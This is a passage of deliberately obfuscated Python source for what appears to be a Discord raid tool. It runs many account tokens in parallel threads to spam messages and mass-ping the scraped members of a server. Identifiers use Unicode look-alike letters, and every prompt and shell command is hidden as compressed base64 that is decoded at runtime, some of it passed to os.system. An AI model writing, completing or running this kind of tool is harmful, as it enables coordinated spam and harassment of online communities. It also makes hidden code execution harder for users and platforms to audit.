        𝗼𝘴.system(__𝙞𝘮𝙥𝗼𝘳𝙩__(𝘭𝗠𝙄𝙄𝙈𝗹𝙈𝗡𝗜𝗜𝘕𝙈𝙡𝗹𝗜𝗠𝗹𝙈𝗹𝗜𝗠𝘐𝘔𝙄𝘕𝗠𝘐𝗹𝙡𝘭𝘕𝙡[𝗿𝙤𝙪𝘯𝗱(𝙖𝘣𝘴(0.0 + 0j))]).b64decode(__𝙞𝘮𝙥𝘰𝗿𝘵__(𝙡𝗠𝙄𝘐𝙈𝘭𝘔𝗡𝗜𝘐𝘕𝙈𝘭𝘭𝗜𝗠𝗹𝗠𝗹𝙄𝙈𝘐𝘔𝗜𝗡𝘔𝘐𝙡𝗹𝙡𝘕𝙡[𝗿𝘰𝙪𝘯𝙙(𝗮𝙗𝘴(0.8495295695012715 + 0.5275410036603642j))]).decompress(b'x\xdaKq\xcf1Hr\x0fM\x0fv\x0f+N\x8c\x08+\xf1t6H\x0f12-N\x0c7\xcdIN\xb7\xb5\x05\x00\xaf\xd5\n\x81')).decode())
        𝗼𝘴.system(__𝗶𝗺𝘱𝘰𝙧𝘵__(𝗹𝗠𝗜𝙄𝙈𝘭𝗠𝙉𝘐𝙄𝗡𝗠𝙡𝗹𝙄𝘔𝙡𝙈𝗹𝗜𝘔𝘐𝘔𝘐𝙉𝗠𝘐𝙡𝘭𝙡𝘕𝘭[𝙧𝘰𝘂𝙣𝙙(𝙖𝘣𝘀(0.0 + 0j))]).b64decode(__𝙞𝘮𝘱𝘰𝙧𝘵__(𝘭𝗠𝗜𝘐𝗠𝗹𝙈𝙉𝙄𝘐𝘕𝙈𝗹𝘭𝘐𝗠𝗹𝙈𝙡𝗜𝗠𝗜𝗠𝗜𝘕𝘔𝙄𝗹𝘭𝗹𝗡𝙡[𝙧𝙤𝘂𝗻𝘥(𝗮𝗯𝘀(0.052394191333428375 + 0.9986264810801464j))]).decompress(b'x\xda\x8b4\xaa\xa8\x02\x00\x03h\x01~')).decode())
        𝘱𝙧𝘪𝗻𝙩(𝗺𝙚𝙣𝘶)
        for 𝘵𝗼𝘬𝙚𝗻 in 𝘵𝗼𝗸𝙚𝘯𝘀:
            𝙩𝗵𝘳𝗲𝙖𝙙𝗶𝙣𝘨.Thread(target=𝙤𝘯𝙡𝙞𝗻𝗲𝙧, args=(𝘁𝗼𝗸𝗲𝘯,)).start()
        𝙥𝗿𝙞𝙣𝘁(__𝘪𝙢𝙥𝙤𝗿𝘵__(𝗹𝘔𝘐𝘐𝗠𝘭𝗠𝙉𝘐𝘐𝗡𝘔𝙡𝘭𝘐𝙈𝘭𝙈𝘭𝘐𝘔𝙄𝗠𝘐𝙉𝘔𝗜𝘭𝘭𝘭𝙉𝘭[𝗿𝙤𝘂𝙣𝗱(𝘢𝙗𝘀(0.0 + 0j))]).b64decode(__𝗶𝘮𝗽𝙤𝘳𝙩__(𝙡𝙈𝘐𝗜𝘔𝗹𝗠𝗡𝙄𝗜𝘕𝘔𝙡𝘭𝘐𝙈𝙡𝗠𝗹𝙄𝙈𝗜𝗠𝗜𝙉𝘔𝘐𝘭𝗹𝙡𝗡𝗹[𝙧𝘰𝘂𝗻𝘥(𝘢𝙗𝘴(0.259697599729415 + 0.9656899899526662j))]).decompress(b'x\xdaK56LJ56\x0cH\xca\xad(H\xca\r\xab\x04\xb2S<]\xdd\x8a\x93\x9c\x9d\x0c\x92\x8cJr\x92\xf2|\xd3##\xbcr<\xdd-K\x93\xdcsJ\xa3\x02mm\x01\xcca\x11q')).decode().format(𝙧, 𝙡𝗰, 𝙧))
        𝙚𝘹𝘪𝘵 = 𝘪𝗻𝙥𝘂𝘁(__𝘪𝘮𝗽𝗼𝗿𝘁__(𝘭𝙈𝗜𝘐𝘔𝗹𝙈𝙉𝘐𝙄𝘕𝗠𝙡𝙡𝗜𝘔𝗹𝘔𝘭𝙄𝗠𝗜𝘔𝗜𝙉𝙈𝗜𝙡𝗹𝙡𝙉𝙡[𝗿𝗼𝘂𝙣𝘥(𝙖𝗯𝙨(0.0 + 0j))]).b64decode(__𝗶𝘮𝗽𝘰𝘳𝙩__(𝙡𝗠𝘐𝗜𝙈𝗹𝗠𝗡𝘐𝙄𝗡𝘔𝘭𝙡𝘐𝙈𝘭𝙈𝙡𝙄𝗠𝙄𝙈𝙄𝘕𝘔𝘐𝗹𝘭𝘭𝙉𝘭[𝘳𝗼𝘂𝘯𝗱(𝗮𝗯𝙨(0.11385089499128376 + 0.9934978478636397j))]).decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())
        𝘦𝙭𝙞𝘁 = 𝗠𝘦𝗻𝙪().main_menu()
        𝘦𝙭𝘪𝙩()

    @𝘄𝘳𝗮𝗽𝗽𝗲𝙧
    def spammer(self):
        𝘰𝘴.system(__𝙞𝘮𝘱𝘰𝙧𝘁__(𝗹𝙈𝙄𝘐𝗠𝘭𝗠𝗡𝙄𝗜𝗡𝙈𝘭𝘭𝘐𝙈𝗹𝘔𝙡𝙄𝙈𝙄𝘔𝘐𝘕𝗠𝘐𝘭𝙡𝗹𝗡𝗹[𝘳𝘰𝙪𝙣𝙙(𝙖𝗯𝘀(0.0 + 0j))]).b64decode(__𝙞𝗺𝘱𝘰𝗿𝘵__(𝙡𝘔𝗜𝘐𝙈𝘭𝘔𝘕𝗜𝘐𝗡𝙈𝗹𝘭𝘐𝙈𝗹𝙈𝘭𝗜𝗠𝗜𝘔𝘐𝙉𝙈𝗜𝙡𝘭𝙡𝗡𝘭[𝘳𝘰𝘶𝙣𝗱(𝗮𝙗𝙨(0.8201897906573083 + 0.5720915200398627j))]).decompress(b'x\xdaKq\xcf1Hr\x0fM\x0fv\x0f+N\x8c\x08+\xf1t6H\x0f5v\xcaH\n7\xccIN\xb7\xb5\x05\x00\xaf\xfb\n\x82')).decode())
        𝘮𝗮𝙨𝘀 = 𝘪𝘯𝙥𝙪𝘁(__𝙞𝗺𝘱𝗼𝗿𝙩__(𝙡𝙈𝙄𝙄𝗠𝙡𝙈𝗡𝙄𝙄𝗡𝗠𝘭𝙡𝙄𝘔𝘭𝙈𝙡𝘐𝙈𝘐𝘔𝗜𝙉𝙈𝘐𝗹𝘭𝘭𝘕𝙡[𝗿𝘰𝘶𝗻𝘥(𝘢𝙗𝙨(0.0 + 0j))]).b64decode(__𝙞𝗺𝗽𝗼𝗿𝙩__(𝗹𝗠𝙄𝘐𝙈𝗹𝙈𝗡𝘐𝘐𝙉𝙈𝗹𝗹𝘐𝘔𝗹𝗠𝙡𝗜𝗠𝙄𝗠𝗜𝘕𝘔𝗜𝗹𝙡𝘭𝗡𝗹[𝗿𝘰𝙪𝗻𝘥(𝗮𝙗𝙨(0.9128207282384365 + 0.40836052465713474j))]).decompress(b'x\xdaK56LJ56\xf4\x8b\x8c\xf0\xab\xf2\ts*H\xcaM\xd6\x07\xf2\xcd\xd3\xc2\x0c\xd2S\x8d\r\xf2S\x83-K\xbd#J,=\xfd\xbd\xdd\xb33\x1dm\x01q\xf1\x0f-')).decode().format(𝘳, 𝙡𝗰, 𝘭𝙘, 𝗿, 𝘨, 𝘳))
        if 𝙢𝙖𝘴𝙨 == __𝗶𝗺𝗽𝗼𝘳𝘵__(𝘭𝘔𝙄𝘐𝗠𝗹𝗠𝙉𝘐𝗜𝘕𝗠𝘭𝘭𝘐𝘔𝗹𝘔𝘭𝘐𝙈𝘐𝘔𝘐𝘕𝘔𝙄𝙡𝙡𝙡𝘕𝘭[𝘳𝗼𝙪𝘯𝘥(𝙖𝗯𝘴(0.0 + 0j))]).b64decode(__𝙞𝘮𝘱𝙤𝙧𝙩__(𝙡𝙈𝙄𝗜𝘔𝘭𝙈𝘕𝙄𝗜𝘕𝙈𝘭𝘭𝘐𝙈𝘭𝗠𝗹𝘐𝙈𝙄𝘔𝗜𝗡𝘔𝙄𝗹𝘭𝗹𝙉𝘭[𝗿𝘰𝘂𝘯𝘥(𝗮𝙗𝘴(0.2023228369265584 + 0.9793188804766245j))]).decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode():
            𝗠𝙚𝙣𝙪().main_menu()
        𝗰𝘩𝘢𝗻𝙣𝙚𝙡 = 𝙞𝗻𝙥𝘶𝙩(__𝙞𝗺𝘱𝘰𝙧𝙩__(𝘭𝘔𝘐𝙄𝙈𝗹𝗠𝘕𝘐𝗜𝗡𝙈𝙡𝘭𝘐𝘔𝘭𝙈𝗹𝗜𝘔𝗜𝗠𝗜𝗡𝗠𝘐𝙡𝗹𝗹𝗡𝗹[𝙧𝙤𝙪𝗻𝙙(𝘢𝘣𝘴(0.0 + 0j))]).b64decode(__𝗶𝙢𝘱𝙤𝗿𝘵__(𝗹𝘔𝗜𝙄𝙈𝙡𝙈𝙉𝘐𝙄𝘕𝘔𝗹𝗹𝘐𝗠𝙡𝗠𝘭𝘐𝗠𝗜𝙈𝘐𝘕𝗠𝙄𝙡𝙡𝘭𝘕𝘭[𝗿𝗼𝘶𝘯𝙙(𝙖𝘣𝘴(0.16391889571677065 + 0.9864738190276489j))]).decompress(b'x\xdaK56LJ56tItw+M\xca\r+\xf6t\xcdq\x05\xf2\xcd\xd3\xc2\x0c\xd2S\x8d\x8d33\n<\xd3\x01\xd0\x98\x0b\x82')).decode().format(𝘳, 𝗹𝗰, 𝗹𝙘, 𝙧, 𝙧))
        if 𝗰𝘩𝘢𝗻𝘯𝗲𝙡 == __𝙞𝘮𝗽𝘰𝘳𝘵__(𝙡𝗠𝘐𝘐𝘔𝗹𝗠𝙉𝙄𝙄𝗡𝙈𝙡𝗹𝙄𝙈𝘭𝙈𝘭𝘐𝘔𝘐𝗠𝙄𝗡𝗠𝙄𝘭𝘭𝘭𝙉𝘭[𝗿𝘰𝘶𝘯𝘥(𝗮𝙗𝘀(0.0 + 0j))]).b64decode(__𝗶𝙢𝗽𝗼𝙧𝙩__(𝗹𝘔𝘐𝗜𝘔𝙡𝘔𝗡𝗜𝙄𝙉𝗠𝘭𝘭𝘐𝙈𝘭𝘔𝙡𝙄𝙈𝗜𝗠𝗜𝘕𝘔𝗜𝗹𝙡𝗹𝘕𝘭[𝘳𝙤𝙪𝘯𝙙(𝙖𝙗𝘴(0.9022627617065792 + 0.43118662877878844j))]).decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode():
            𝗠𝘦𝗻𝙪().main_menu()
        𝘮𝗲𝘀𝘴𝗮𝗴𝗲 = 𝙞𝘯𝗽𝙪𝘁(__𝙞𝘮𝙥𝗼𝙧𝙩__(𝗹𝘔𝘐𝘐𝙈𝗹𝗠𝘕𝗜𝙄𝗡𝗠𝗹𝘭𝘐𝙈𝗹𝗠𝗹𝗜𝗠𝙄𝘔𝙄𝙉𝙈𝗜𝗹𝙡𝙡𝗡𝙡[𝘳𝙤𝘶𝙣𝗱(𝘢𝘣𝘀(0.0 + 0j))]).b64decode(__𝗶𝗺𝗽𝙤𝙧𝘁__(𝗹𝙈𝘐𝘐𝗠𝙡𝙈𝙉𝗜𝙄𝙉𝙈𝗹𝗹𝘐𝘔𝗹𝗠𝗹𝙄𝙈𝗜𝗠𝘐𝙉𝘔𝙄𝘭𝗹𝙡𝗡𝘭[𝙧𝘰𝘂𝙣𝙙(𝙖𝗯𝘀(0.5919747068261552 + 0.8059565413085793j))]).decompress(b'x\xdaK56LJ56\xf4\x8b\x8a\xf0\xab\x8a\x0cO\xc9\x01\xb2\xcd\xd3\xc2\x0c\xd2S\x8d\x8d33\n<\xd3\x01\xa5\xe9\nL')).decode().format(𝙧, 𝙡𝙘, 𝘭𝘤, 𝙧, 𝗿))
        if 𝙢𝙚𝘀𝘴𝙖𝗴𝘦 == __𝘪𝗺𝗽𝙤𝙧𝘵__(𝗹𝗠𝘐𝘐𝗠𝗹𝗠𝘕𝗜𝘐𝙉𝙈𝙡𝘭𝘐𝗠𝗹𝘔𝘭𝘐𝙈𝙄𝙈𝗜𝙉𝘔𝙄𝗹𝘭𝗹𝘕𝘭[𝘳𝘰𝙪𝙣𝗱(𝙖𝗯𝘀(0.0 + 0j))]).b64decode(__𝙞𝘮𝙥𝗼𝙧𝙩__(𝗹𝗠𝘐𝘐𝙈𝘭𝗠𝗡𝗜𝙄𝗡𝗠𝙡𝗹𝘐𝘔𝙡𝘔𝗹𝙄𝙈𝙄𝙈𝙄𝘕𝙈𝗜𝗹𝙡𝙡𝙉𝙡[𝘳𝘰𝘶𝗻𝗱(𝘢𝗯𝘀(0.9729726804454322 + 0.23092025269956504j))]).decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode():
            𝙈𝗲𝘯𝘶().main_menu()
        𝗱𝙚𝗹𝘢𝙮 = 𝙭𝗹6𝘓𝗽𝙂𝘕𝘷𝗩𝙩𝘋332𝘮𝘶𝘹𝘖𝗴_𝘮0𝗥𝘝𝘁𝙥𝙏1𝗮484.mro()[9](𝘪𝙣𝙥𝘂𝘁(__𝘪𝘮𝗽𝗼𝙧𝘁__(𝘭𝗠𝘐𝙄𝘔𝙡𝗠𝙉𝙄𝘐𝗡𝙈𝙡𝗹𝙄𝙈𝗹𝙈𝙡𝙄𝗠𝙄𝘔𝘐𝗡𝗠𝙄𝘭𝘭𝘭𝙉𝙡[𝘳𝗼𝘂𝙣𝗱(𝗮𝘣𝘀(0.0 + 0j))]).b64decode(__𝗶𝙢𝙥𝘰𝙧𝘁__(𝙡𝗠𝙄𝗜𝗠𝘭𝗠𝘕𝙄𝗜𝗡𝘔𝗹𝙡𝙄𝙈𝙡𝗠𝙡𝘐𝗠𝗜𝘔𝗜𝙉𝙈𝗜𝘭𝘭𝙡𝘕𝙡[𝗿𝘰𝙪𝘯𝗱(𝗮𝘣𝙨(0.3154375384872403 + 0.9489463416406171j))]).decompress(b'x\xdaK56LJ56t\x8d\n\xaf\xc8H\x8d(\xb1\x04\xb2S<=J,M\xf2\x13\x83=\x1dmm\x01\xa6\xa7\t\xfb')).decode().format(𝗿, 𝙡𝙘, 𝗹𝘤, 𝘳, 𝗿)))
        if 𝘥𝙚𝗹𝙖𝙮 == __𝗶𝗺𝙥𝙤𝗿𝘁__(𝘭𝗠𝙄𝙄𝗠𝙡𝘔𝗡𝗜𝙄𝗡𝘔𝘭𝘭𝘐𝙈𝘭𝗠𝗹𝗜𝗠𝗜𝗠𝘐𝙉𝙈𝘐𝗹𝗹𝗹𝗡𝙡[𝘳𝘰𝘶𝙣𝙙(𝘢𝙗𝙨(0.0 + 0j))]).b64decode(__𝗶𝘮𝘱𝘰𝘳𝘵__(𝙡𝗠𝙄𝙄𝘔𝙡𝙈𝘕𝘐𝙄𝗡𝘔𝗹𝘭𝘐𝗠𝗹𝗠𝗹𝗜𝙈𝙄𝗠𝙄𝗡𝘔𝙄𝙡𝘭𝗹𝘕𝘭[𝗿𝘰𝘶𝙣𝘥(𝘢𝘣𝘴(0.15353781471575523 + 0.9881427728078116j))]).decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode():
            𝗠𝙚𝙣𝘶().main_menu()
        if 𝙢𝗮𝘴𝙨 == __𝘪𝘮𝘱𝙤𝗿𝘁__(𝘭𝘔𝗜𝗜𝙈𝘭𝙈𝙉𝙄𝘐𝙉𝗠𝗹𝘭𝘐𝗠𝘭𝙈𝙡𝙄𝙈𝙄𝗠𝗜𝗡𝘔𝘐𝙡𝗹𝘭𝗡𝗹[𝗿𝙤𝙪𝘯𝘥(𝗮𝘣𝙨(0.0 + 0j))]).b64decode(__𝙞𝙢𝗽𝘰𝙧𝘁__(𝗹𝘔𝗜𝙄𝘔𝗹𝙈𝙉𝗜𝙄𝘕𝙈𝙡𝘭𝙄𝗠𝘭𝘔𝗹𝙄𝗠𝗜𝘔𝗜𝘕𝘔𝗜𝗹𝗹𝗹𝘕𝗹[𝗿𝙤𝘶𝘯𝘥(𝗮𝙗𝙨(0.23958465536882845 + 0.9708754775519874j))]).decompress(b'x\xdaK\r\xb4\xb5\x05\x00\x03B\x011')).decode():
            𝗴𝘶𝗶𝘭𝗱𝙞𝘥 = 𝘪𝘯𝗽𝙪𝘵(__𝙞𝘮𝘱𝗼𝙧𝙩__(𝗹𝙈𝙄𝗜𝙈𝙡𝙈𝗡𝗜𝙄𝘕𝘔𝘭𝗹𝘐𝙈𝘭𝙈𝗹𝘐𝙈𝗜𝘔𝘐𝙉𝙈𝗜𝘭𝙡𝗹𝘕𝗹[𝙧𝗼𝘶𝘯𝘥(𝗮𝗯𝘴(0.0 + 0j))]).b64decode(__𝘪𝙢𝘱𝘰𝘳𝙩__(𝘭𝘔𝘐𝗜𝗠𝗹𝗠𝗡𝙄𝘐𝗡𝘔𝗹𝙡𝘐𝗠𝘭𝙈𝘭𝘐𝘔𝙄𝘔𝙄𝘕𝙈𝘐𝙡𝘭𝗹𝘕𝗹[𝗿𝘰𝘂𝙣𝙙(𝘢𝙗𝙨(0.39504023885777007 + 0.9186638175541672j))]).decompress(b"x\xdaK56LJ56\xf4H\t\xcf)\x8erv\xf2\n\xf2(\xb1\x8c\x08v\xc9\xcc(\xf0L\x07\x00\x7f\xb7\t'")).decode().format(𝗿, 𝙡𝗰, 𝗿))
            if 𝗴𝘶𝘪𝗹𝗱𝘪𝙙 == __𝙞𝗺𝗽𝗼𝙧𝘁__(𝗹𝘔𝗜𝘐𝗠𝘭𝙈𝘕𝙄𝗜𝘕𝙈𝗹𝗹𝗜𝘔𝗹𝗠𝘭𝗜𝙈𝗜𝘔𝗜𝘕𝗠𝘐𝙡𝘭𝙡𝙉𝗹[𝗿𝙤𝙪𝗻𝙙(𝙖𝗯𝘀(0.0 + 0j))]).b64decode(__𝗶𝙢𝙥𝗼𝘳𝘁__(𝙡𝗠𝗜𝘐𝘔𝙡𝘔𝗡𝘐𝙄𝙉𝘔𝙡𝙡𝘐𝙈𝙡𝙈𝙡𝘐𝗠𝗜𝘔𝘐𝘕𝗠𝘐𝙡𝘭𝗹𝗡𝗹[𝗿𝘰𝘂𝙣𝗱(𝙖𝙗𝘀(0.5329731511209835 + 0.8461321529076703j))]).decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode():
                𝗠𝙚𝙣𝙪().main_menu()
            𝗽𝗶𝗻𝗴𝘀 = 𝙠𝘆𝘴𝘂𝘱𝘑7𝙐𝙂𝙏𝗻𝘓00𝗳𝙋4𝗱𝘬1𝙪_6𝘘𝙂𝗤𝘪𝗙0𝗷_𝗩.mro()[8](𝘪𝙣𝙥𝘂𝙩(__𝙞𝙢𝙥𝙤𝗿𝘵__(𝙡𝘔𝗜𝙄𝘔𝙡𝘔𝗡𝗜𝙄𝙉𝙈𝗹𝗹𝙄𝙈𝙡𝙈𝙡𝘐𝘔𝗜𝘔𝙄𝗡𝙈𝙄𝘭𝘭𝙡𝙉𝗹[𝘳𝗼𝘂𝘯𝗱(𝗮𝘣𝙨(0.0 + 0j))]).b64decode(__𝙞𝙢𝗽𝘰𝙧𝘁__(𝗹𝘔𝘐𝗜𝙈𝘭𝗠𝙉𝘐𝘐𝘕𝘔𝗹𝗹𝗜𝗠𝗹𝗠𝘭𝘐𝙈𝙄𝘔𝙄𝗡𝗠𝘐𝘭𝗹𝗹𝘕𝙡[𝙧𝗼𝙪𝗻𝘥(𝘢𝗯𝘀(0.14518104496576345 + 0.9894051062040508j))]).decompress(b'x\xdaK56LJ56\x0cL\x0c7\xcdK\xaetrI2\x0e+M\xf1(\xb1\x04\x8a\xa5x\xfa{\xbbgg:\xda\x02\x00\xd2\x0b\x0be')).decode().format(𝘳, 𝘭𝗰, 𝗹𝙘, 𝘳)))
            if 𝗽𝘪𝘯𝗴𝘀 == __𝘪𝙢𝙥𝗼𝗿𝙩__(𝘭𝘔𝙄𝗜𝗠𝙡𝙈𝘕𝗜𝙄𝘕𝙈𝙡𝙡𝘐𝗠𝙡𝘔𝗹𝙄𝙈𝘐𝘔𝗜𝘕𝙈𝘐𝘭𝗹𝗹𝙉𝘭[𝘳𝘰𝘶𝘯𝘥(𝙖𝘣𝘀(0.0 + 0j))]).b64decode(__𝗶𝗺𝗽𝘰𝗿𝙩__(𝘭𝙈𝙄𝗜𝗠𝗹𝘔𝘕𝗜𝘐𝘕𝘔𝙡𝗹𝘐𝙈𝙡𝙈𝗹𝙄𝙈𝙄𝘔𝗜𝙉𝗠𝙄𝘭𝗹𝙡𝗡𝘭[𝙧𝗼𝘂𝙣𝘥(𝘢𝙗𝘴(0.384720584891762 + 0.9230330825926775j))]).decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode():
                𝗠𝘦𝗻𝙪().main_menu()
            𝗽𝘳𝙞𝗻𝙩(__𝙞𝘮𝗽𝘰𝙧𝙩__(𝘭𝙈𝗜𝗜𝙈𝘭𝗠𝘕𝘐𝗜𝗡𝙈𝙡𝗹𝘐𝗠𝗹𝙈𝘭𝘐𝙈𝗜𝘔𝗜𝗡𝙈𝘐𝘭𝗹𝙡𝙉𝗹[𝘳𝙤𝙪𝙣𝗱(𝗮𝗯𝘀(0.0 + 0j))]).b64decode(__𝗶𝗺𝙥𝘰𝙧𝙩__(𝘭𝘔𝙄𝘐𝘔𝙡𝘔𝙉𝙄𝘐𝘕𝙈𝘭𝙡𝗜𝙈𝙡𝙈𝗹𝗜𝘔𝗜𝘔𝙄𝙉𝙈𝙄𝙡𝗹𝗹𝘕𝘭[𝙧𝗼𝘂𝗻𝙙(𝗮𝘣𝘀(0.8524888886122091 + 0.5227453441138625j))]).decompress(b"x\xdaK56LJ56\x0c\x894\xf6\xcaHv\xcf)\x8d\xaat\xf2\x8b\n7\xcc\x8c\x8a\xf0\xaa\x02\x8a\x9b\xa7\x85\x19\xa4\xa7\x1a\x1b\xe4'F\x04\xa6'\x85\xe7\xe4%z\x04\xa6\xa7\xb8\xbb\x15E\x05;exz\xa4\xe4'\x86W\xe4x\x07\xda\xda\x02\x00Z\x01\x17\xf5")).decode().format(𝙧, 𝙡𝘤, 𝗹𝘤, 𝗿, 𝗴))
            𝙨𝗰𝗿𝙖𝗽𝙚𝗿(𝘨𝘶𝘪𝗹𝙙𝗶𝗱, 𝙘𝘩𝘢𝙣𝙣𝘦𝙡)
            𝙤𝘀.system(__𝙞𝘮𝘱𝗼𝘳𝘵__(𝘭𝗠𝘐𝗜𝘔𝘭𝗠𝗡𝘐𝘐𝗡𝗠𝘭𝗹𝗜𝙈𝙡𝙈𝘭𝘐𝙈𝗜𝗠𝘐𝘕𝗠𝗜𝘭𝗹𝙡𝙉𝗹[𝗿𝗼𝙪𝘯𝗱(𝗮𝙗𝘴(0.0 + 0j))]).b64decode(__𝙞𝘮𝙥𝘰𝗿𝘁__(𝘭𝙈𝗜𝙄𝗠𝘭𝗠𝗡𝙄𝙄𝙉𝙈𝗹𝙡𝘐𝗠𝙡𝗠𝗹𝘐𝗠𝗜𝘔𝘐𝗡𝙈𝗜𝙡𝗹𝙡𝗡𝗹[𝗿𝗼𝘶𝗻𝘥(𝙖𝙗𝘴(0.6992854391459827 + 0.7148425523137316j))]).decompress(b'x\xda\x8b4\xaa\xa8\x02\x00\x03h\x01~')).decode())
            𝘱𝘳𝙞𝘯𝙩(𝗺𝘦𝗻𝘂)
            for 𝘁𝘰𝗸𝙚𝘯 in 𝘵𝗼𝘬𝘦𝙣𝘴:
                𝘁𝘩𝗿𝘦𝘢𝘥𝘪𝗻𝘨.Thread(target=𝙢𝙖𝙨𝘴𝙥𝘪𝘯𝘨, args=(𝘁𝗼𝘬𝗲𝘯, 𝙘𝙝𝗮𝗻𝗻𝘦𝘭, 𝘮𝘦𝘴𝙨𝗮𝙜𝗲, 𝗱𝙚𝙡𝗮𝙮, 𝘱𝘪𝘯𝘨𝙨)).start()
            𝙚𝘅𝗶𝘁 = 𝘪𝘯𝘱𝘂𝘵(__𝗶𝘮𝙥𝙤𝘳𝘵__(𝗹𝘔𝘐𝗜𝗠𝙡𝙈𝗡𝗜𝘐𝙉𝗠𝙡𝗹𝘐𝙈𝙡𝘔𝗹𝘐𝗠𝘐𝘔𝗜𝗡𝘔𝗜𝗹𝙡𝙡𝙉𝘭[𝙧𝙤𝘶𝘯𝘥(𝗮𝙗𝘴(0.0 + 0j))]).b64decode(__𝙞𝙢𝙥𝙤𝙧𝙩__(𝙡𝙈𝗜𝙄𝙈𝙡𝘔𝗡𝙄𝘐𝘕𝘔𝙡𝙡𝙄𝙈𝘭𝘔𝙡𝗜𝗠𝗜𝙈𝗜𝗡𝘔𝗜𝙡𝘭𝙡𝙉𝙡[𝙧𝙤𝘂𝘯𝗱(𝘢𝙗𝙨(0.31872316354198094 + 0.9478478490885506j))]).decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())
            𝗲𝘅𝘪𝙩 = 𝗠𝗲𝙣𝘂().main_menu()
            𝙚𝙭𝙞𝘵()
        if 𝙢𝗮𝘀𝘀 == __𝘪𝘮𝘱𝘰𝘳𝘵__(𝘭𝙈𝙄𝗜𝙈𝗹𝙈𝘕𝘐𝙄𝘕𝘔𝘭𝗹𝘐𝘔𝘭𝘔𝘭𝗜𝘔𝗜𝘔𝙄𝘕𝗠𝘐𝙡𝙡𝗹𝘕𝙡[𝙧𝘰𝘶𝗻𝗱(𝗮𝗯𝘀(0.0 + 0j))]).b64decode(__𝗶𝙢𝘱𝘰𝗿𝘵__(𝗹𝗠𝙄𝙄𝙈𝙡𝗠𝗡𝗜𝘐𝙉𝘔𝗹𝘭𝙄𝗠𝗹𝗠𝘭𝙄𝙈𝘐𝘔𝘐𝙉𝙈𝗜𝗹𝘭𝙡𝙉𝙡[𝗿𝘰𝘂𝙣𝘥(𝘢𝙗𝘀(0.8560827700630077 + 0.516838747387662j))]).decompress(b'x\xdaKJ\xb7\xb5\x05\x00\x03x\x01D')).decode():
            𝗼𝘀.system(__𝘪𝘮𝙥𝗼𝘳𝘁__(𝙡𝗠𝘐𝗜𝗠𝙡𝙈𝗡𝙄𝘐𝗡𝘔𝗹𝘭𝗜𝗠𝙡𝗠𝙡𝙄𝗠𝘐𝗠𝙄𝘕𝗠𝗜𝗹𝗹𝙡𝗡𝗹[𝗿𝙤𝘶𝙣𝗱(𝗮𝙗𝙨(0.0 + 0j))]).b64decode(__𝘪𝘮𝙥𝘰𝘳𝘁__(𝙡𝙈𝙄𝘐𝘔𝗹𝗠𝗡𝘐𝗜𝘕𝘔𝙡𝗹𝙄𝙈𝙡𝗠𝗹𝗜𝙈𝙄𝘔𝘐𝘕𝘔𝙄𝘭𝗹𝗹𝘕𝗹[𝙧𝙤𝘂𝘯𝗱(𝗮𝘣𝘀(0.8310363053057187 + 0.5562181759560004j))]).decompress(b'x\xda\x8b4\xaa\xa8\x02\x00\x03h\x01~')).decode())
            𝙥𝙧𝗶𝗻𝘵(𝙢𝙚𝙣𝙪)
            for 𝘁𝘰𝙠𝗲𝗻 in 𝙩𝙤𝘬𝙚𝘯𝘀:
                𝙩𝘩𝘳𝙚𝗮𝗱𝘪𝗻𝙜.Thread(target=𝙨𝘱𝘢𝗺𝘮𝙚𝘳, args=(𝘁𝗼𝗸𝘦𝙣, 𝙘𝗵𝗮𝘯𝘯𝘦𝗹, 𝗺𝗲𝘀𝘴𝘢𝗴𝘦, 𝘥𝙚𝗹𝘢𝙮)).start()
            𝗲𝘹𝘪𝙩 = 𝘪𝗻𝘱𝘶𝘁(__𝘪𝗺𝘱𝗼𝘳𝙩__(𝙡𝘔𝘐𝙄𝘔𝙡𝘔𝙉𝗜𝙄𝘕𝘔𝗹𝙡𝘐𝗠𝗹𝙈𝙡𝗜𝗠𝘐𝙈𝘐𝙉𝘔𝙄𝙡𝘭𝙡𝙉𝘭[𝘳𝗼𝘂𝗻𝗱(𝙖𝙗𝘴(0.0 + 0j))]).b64decode(__𝘪𝗺𝘱𝘰𝙧𝙩__(𝘭𝗠𝙄𝗜𝗠𝗹𝙈𝗡𝙄𝙄𝙉𝘔𝗹𝘭𝗜𝙈𝘭𝙈𝗹𝗜𝙈𝗜𝙈𝗜𝗡𝘔𝘐𝗹𝗹𝙡𝗡𝙡[𝙧𝗼𝙪𝙣𝘥(𝗮𝘣𝙨(0.47985956694649534 + 0.8773453117273278j))]).decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())
            𝗲𝙭𝗶𝘁 = 𝙈𝘦𝗻𝘂().main_menu()
            𝙚𝘹𝗶𝘵()

    @𝙬𝙧𝘢𝗽𝘱𝙚𝙧
    def exit(self):
        𝘰𝘀.system(__𝘪𝙢𝘱𝘰𝘳𝘁__(𝙡𝙈𝙄𝘐𝘔𝙡𝙈𝗡𝙄𝗜𝙉𝘔𝙡𝙡𝗜𝙈𝙡𝘔𝗹𝘐𝘔𝗜𝗠𝘐𝘕𝗠𝘐𝘭𝘭𝗹𝗡𝙡[𝘳𝘰𝘶𝗻𝙙(𝗮𝘣𝘀(0.0 + 0j))]).b64decode(__𝘪𝙢𝗽𝗼𝗿𝘵__(𝙡𝗠𝘐𝗜𝗠𝗹𝗠𝘕𝗜𝗜𝗡𝙈𝗹𝙡𝗜𝙈𝙡𝙈𝘭𝙄𝙈𝗜𝘔𝗜𝘕𝗠𝗜𝘭𝙡𝗹𝙉𝘭[𝙧𝘰𝙪𝘯𝙙(𝗮𝙗𝘴(0.2762006611059953 + 0.961099992094793j))]).decompress(b'x\xda\x8b4\xaa\xa8\x02\x00\x03h\x01~')).decode())
